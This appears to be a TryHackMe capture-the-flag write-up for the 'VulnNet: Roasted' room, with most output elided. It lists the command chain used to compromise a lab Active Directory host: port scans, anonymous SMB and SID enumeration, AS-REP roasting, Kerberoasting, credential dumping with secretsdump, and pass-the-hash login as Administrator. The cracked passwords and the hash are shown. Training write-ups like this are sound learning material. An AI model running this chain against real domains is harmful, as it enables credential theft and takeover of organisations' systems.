...
This is a **TryHackMe** room which can be found at: {{< rawhtml >}}<a href="https://tryhackme.com/room/vulnnetroasted" target="_blank" style="color:#E30F0F;">VulnNet: Roasted</a>{{< /rawhtml >}}
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `nmap -p- -T4 -Pn -v 10.10.232.200`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `smbmap -H 10.10.232.200 -u anonymous`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `/opt/impacket/examples/lookupsid.py anonymous@10.10.232.200`
```shell
...
{{< rawhtml >}}<br> {{< /rawhtml >}}
- {{< rawhtml >}}Command: {{< /rawhtml >}} `/opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `/opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.10.232.200 -request`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `evil-winrm -i 10.10.232.200 -u enterprise-core-vn`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `smbclient \\\\10.10.232.200\\NETLOGON -U enterprise-core-vn`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `/opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.232.200`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d`
```shell
...
{{< rawhtml >}}
  <img src="../../../thm/vulnnetroasted/vulnnetroasted.png" alt="Olympus photo" style="width:700px;height:300px;">
{{< /rawhtml >}}
